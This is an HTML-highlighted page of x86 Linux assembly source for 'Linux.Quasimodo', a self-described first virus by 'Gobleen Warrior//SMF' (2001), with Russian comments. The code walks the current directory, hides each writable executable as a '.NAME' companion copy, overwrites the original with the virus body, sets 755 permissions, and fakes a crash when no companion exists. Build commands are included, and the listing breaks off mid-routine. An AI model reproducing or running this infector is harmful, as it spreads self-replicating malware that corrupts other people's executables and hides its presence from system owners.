<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>QUASI.S</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">#
#                             </span><span class="sc4">&lt;</span><span class="sc5">Linux.Quasimodo</span><span class="sc4">&gt;</span><span class="sc0">
#
#    Это мой первый вирь под </span><span class="sc5">Linux.</span><span class="sc0"> Примитивный компанион</span><span class="sc5">.</span><span class="sc0"> Поражает файлы в
# текущем каталоге</span><span class="sc4">,</span><span class="sc0"> копируя их в файлы</span><span class="sc4">,</span><span class="sc0"> с именами типа </span><span class="sc3">".ИМЯ"</span><span class="sc4">,</span><span class="sc0"> где ИМЯ </span><span class="sc4">-</span><span class="sc0">
# оригинальное имя файла</span><span class="sc5">.</span><span class="sc0"> Такие файлф в </span><span class="sc5">Linux</span><span class="sc0"> являются скрытыми</span><span class="sc5">.</span><span class="sc0"> Проверяет
# заражаемые файлы на право записи текущим пользователем</span><span class="sc4">,</span><span class="sc0"> и заражает только в
# случае допустимости запуска</span><span class="sc5">.</span><span class="sc0"> Обоим файлам </span><span class="sc4">(</span><span class="sc0">и оригинальному</span><span class="sc4">,</span><span class="sc0"> и компаниону
# ставит атрибуты </span><span class="sc5">rwxr</span><span class="sc4">-</span><span class="sc5">xr</span><span class="sc4">-</span><span class="sc5">x.</span><span class="sc0"> После обработки всех доступных файлов запускает
# файл </span><span class="sc3">".ИМЯ"</span><span class="sc4">,</span><span class="sc0"> где ИМЯ </span><span class="sc4">-</span><span class="sc0"> имя запущенного файла</span><span class="sc5">.</span><span class="sc0"> В случае отсуствия в текущем
# каталоге вышеуказанного файла</span><span class="sc4">,</span><span class="sc0"> вызывает деление на ноль</span><span class="sc4">,</span><span class="sc0"> для эмуляции
# ошибки в программе</span><span class="sc5">.</span><span class="sc0">
#    Вирь крайне прост</span><span class="sc4">,</span><span class="sc0"> неоптимизирован</span><span class="sc4">,</span><span class="sc0"> и вообще убог и страшен</span><span class="sc4">,</span><span class="sc0"> отсюда и
# название</span><span class="sc5">.</span><span class="sc0"> Но с учетом того</span><span class="sc4">,</span><span class="sc0"> что </span><span class="sc5">Linux</span><span class="sc0"> я учу </span><span class="sc4">(</span><span class="sc0">на момент написания</span><span class="sc4">)</span><span class="sc0"> около
# трех недель</span><span class="sc4">,</span><span class="sc0"> по моему все не так уж и плохо</span><span class="sc5">.</span><span class="sc0"> По крайней мере я на это
# надеюсь </span><span class="sc4">:)))</span><span class="sc0">
#
# </span><span class="sc2">17.2.01</span><span class="sc0">                                            </span><span class="sc4">(</span><span class="sc10">C</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">Gobleen</span><span class="sc0"> </span><span class="sc5">Warrior</span><span class="sc4">//</span><span class="sc5">SMF</span><span class="sc0">

# </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">o</span><span class="sc0"> </span><span class="sc5">quasi.o</span><span class="sc0"> </span><span class="sc5">quasi.s</span><span class="sc0">
# </span><span class="sc5">ld</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">s</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">o</span><span class="sc0"> </span><span class="sc5">quasi</span><span class="sc0"> </span><span class="sc5">quasi.o</span><span class="sc0">

                        </span><span class="sc10">.text</span><span class="sc0">
                        </span><span class="sc5">.globl</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">

</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">
# Сохраним адрес нулевого аргумента командной строки </span><span class="sc4">(</span><span class="sc5">argv</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">])</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> имени
# запущенного файла</span><span class="sc5">.</span><span class="sc0">
                        </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                       # </span><span class="sc5">argc</span><span class="sc0">
                        </span><span class="sc5">popl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                       # </span><span class="sc5">argv</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">our_name_addr</span><span class="sc0">

# Откроем текущий каталог
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # </span><span class="sc5">Open</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$current_dir</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dir_handle</span><span class="sc0">
                        </span><span class="sc5">incl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                       # Ошибки</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

# Считаем записи в каталоге
</span><span class="sc5">next_file</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$89</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                  # </span><span class="sc5">ReadDir</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">dir_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">decl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                       # Есть файл</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

# Проверим имя на символ точки в начале</span><span class="sc5">.</span><span class="sc0">
                        </span><span class="sc5">cmpb</span><span class="sc0"> </span><span class="sc5">$0x2e</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">name_buffa</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">       # Проверка на </span><span class="sc3">"."</span><span class="sc0"> в
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">                    # начале имени файла

# Имемем ли мы право запуска найденного файла</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$33</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                  # </span><span class="sc5">Access</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">                   # на запуск
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">orl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                  # Низзя</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">                   # К другому файлу

# Сформируем имя с точкой в начале </span><span class="sc4">-</span><span class="sc0"> засунем ее в буфер перед оригинальным
# именем</span><span class="sc4">,</span><span class="sc0"> то есть по адресу </span><span class="sc5">name_buffa</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">
                        </span><span class="sc5">movb</span><span class="sc0"> </span><span class="sc5">$0x2e</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">name_buffa</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">

# Проверим наличие файла </span><span class="sc3">".&lt;ИМЯ&gt;"</span><span class="sc0"> путем попытки создания его
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # </span><span class="sc5">Open</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">        # </span><span class="sc5">.</span><span class="sc4">&lt;</span><span class="sc0">ИМЯ</span><span class="sc4">&gt;</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$0001</span><span class="sc4">|</span><span class="sc2">0100</span><span class="sc4">|</span><span class="sc2">0200</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">      # </span><span class="sc5">create</span><span class="sc4">+</span><span class="sc5">write</span><span class="sc4">+</span><span class="sc5">excl</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$0755</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">cmpl</span><span class="sc0"> </span><span class="sc5">$0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # Файл существует</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">no_dotted</span><span class="sc0">                   # Нет</span><span class="sc10">?</span><span class="sc0"> Создадим его </span><span class="sc4">:))</span><span class="sc0">

                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">                 # Да</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> Закроем его
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">                   # И к другому файлу

# Файл</span><span class="sc4">-</span><span class="sc0">компанион создан и его дескриптор в </span><span class="sc5">%EAX</span><span class="sc0">
</span><span class="sc5">no_dotted</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dotted_fd</span><span class="sc0">            # сохраним дескриптор

# Откроем найденный файл для чтения</span><span class="sc4">/</span><span class="sc0">записи
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">cmpl</span><span class="sc0"> </span><span class="sc5">$0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # Ошибки</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">victim_opened</span><span class="sc0">               # Нет</span><span class="sc10">?</span><span class="sc0"> Замечательно </span><span class="sc4">:))</span><span class="sc0">

# Если произошла ошибка </span><span class="sc4">-</span><span class="sc0"> удалим файл</span><span class="sc4">-</span><span class="sc0">компанион
</span><span class="sc5">del_dotted</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                  # </span><span class="sc5">Unlink</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">        # С точкой в имени
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">                   # К следующему файлу

# Если нет ошибок</span><span class="sc4">,</span><span class="sc0"> обработаем файл
</span><span class="sc5">victim_opened</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">victim_fd</span><span class="sc0">            # сохраним дескриптор

# Считать блок </span><span class="sc4">(</span><span class="sc2">512</span><span class="sc0"> байт</span><span class="sc4">)</span><span class="sc0"> из найденного файла
</span><span class="sc5">read_block</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">victim_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$read_buffa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$512</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # Ошибки</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">write_to_dotted</span><span class="sc0">             # Нет</span><span class="sc10">?</span><span class="sc0"> Запишем блок
                                                        # в компаниона
# Есть ошибки</span><span class="sc10">?</span><span class="sc0"> Закроем найденный и компанионский файлы
</span><span class="sc5">shit_fuck</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">victim_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">dotted_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">del_dotted</span><span class="sc0">

# Запишем блок в файл с точкой в имени
</span><span class="sc5">write_to_dotted</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">                 # Размер записываемого
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # </span><span class="sc5">Write</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">dotted_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">            # В файл с точкой
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$read_buffa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">$512</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                  # Записано </span><span class="sc2">512?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">read_block</span><span class="sc0">                   # Следующий блок

# Если было записано не </span><span class="sc2">512</span><span class="sc0"> байт</span><span class="sc4">,</span><span class="sc0"> значит или все скопировано</span><span class="sc4">,</span><span class="sc0"> или ошибка</span><span class="sc5">.</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">shit_fuck</span><span class="sc0">                    # Ага</span><span class="sc4">,</span><span class="sc0"> ошибка </span><span class="sc4">:(</span><span class="sc0">

# Нет ошибки</span><span class="sc5">.</span><span class="sc0"> Значит весь найденный файл скопирован с компаниона и можно этот
# компанионский файл закрыть
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # </span><span class="sc5">Close</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">dotted_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

# Передвинуть указатель работы с файлом в его начало
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$19</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                  # </span><span class="sc5">Lseek</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">victim_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">                 # На ноль байтов
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">                 # От начала
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

# Открыть себя самого
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">our_name_addr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc5">cmpl</span><span class="sc0"> </span><span class="sc5">$0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # Ошибки</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">we_are_openned</span><span class="sc0">              # Нет</span><span class="sc5">.</span><span class="sc0"> Все в порядке</span><span class="sc5">.</span><span class="sc0">

# Если произошла ошибка</span><span class="sc4">,</span><span class="sc0"> закроем найденный файл
</span><span class="sc5">close_vict_err</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">victim_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">del_dotted</span><span class="sc0">                  # И удалим его копию
                                                        # с точкой в имени
# Мы открыты </span><span class="sc4">-</span><span class="sc0"> скопируем себя в начало найденного файла
</span><span class="sc5">we_are_openned</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">our_fd</span><span class="sc0">               # Сохраним дескриптор

# Считаем блок в </span><span class="sc2">512</span><span class="sc0"> байт из себя
</span><span class="sc5">read_us</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">our_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$read_buffa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$512</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # Ошибки</span><span class="sc10">?</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">write_to_victim</span><span class="sc0">

# Ага</span><span class="sc4">,</span><span class="sc0"> ошибки</span><span class="sc5">.</span><span class="sc0"> Закроем себя</span><span class="sc5">.</span><span class="sc0">
</span><span class="sc5">iopti</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">our_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_vict_err</span><span class="sc0">              # Закроем жертву
                                                        # и удалим компаниона
# Запишем считанный блок в найденный файл
</span><span class="sc5">write_to_victim</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">                 # Сколько писать
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # </span><span class="sc5">Write</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">victim_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">            # В найденный файл
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$read_buffa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">$512</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">read_us</span><span class="sc0">                      # Обработать следующий
                                                        # блок
# Если было записано не </span><span class="sc2">512</span><span class="sc0"> байт</span><span class="sc4">,</span><span class="sc0"> значит или все скопировано</span><span class="sc4">,</span><span class="sc0"> или ошибка</span><span class="sc5">.</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">iopti</span><span class="sc0">                        # Да</span><span class="sc5">.</span><span class="sc0"> Была ошибка</span><span class="sc5">.</span><span class="sc0">

# Нет ошибок</span><span class="sc10">?</span><span class="sc0"> Значит мы полностью скопировались в начало найденного файла</span><span class="sc4">,</span><span class="sc0">
# теперь можно закрыть его</span><span class="sc5">.</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                   # </span><span class="sc5">Close</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">victim_fd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

# Установим найденному файлу права доступа </span><span class="sc2">755</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rwxr</span><span class="sc4">-</span><span class="sc5">xr</span><span class="sc4">-</span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">                  # </span><span class="sc5">Chmod</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$0755</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

# Обработаем следующий файл
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_file</span><span class="sc0">

# Подготовим к запуску наш собственный файл</span><span class="sc4">-</span><span class="sc0">компанион</span><span class="sc5">.</span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc5">movb</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">name_buffa</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">our_name_addr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%esi</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edi</span><span class="sc0">
                        </span><span class="sc6">lodsw</span><span class="sc0">
                        </span><span class="sc5">cmpw</span><span class="sc0"> </span><span class="sc5">$0x2f2e</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ax</span><span class="sc0">               </span><span class="sc4">//</span><span class="sc0"> Пропустить </span><span class="sc3">"./"</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_sign</span><span class="sc0">                    </span><span class="sc4">//</span><span class="sc0"> в начале имени
                        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">next_sign</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">lodsb</span><span class="sc0">
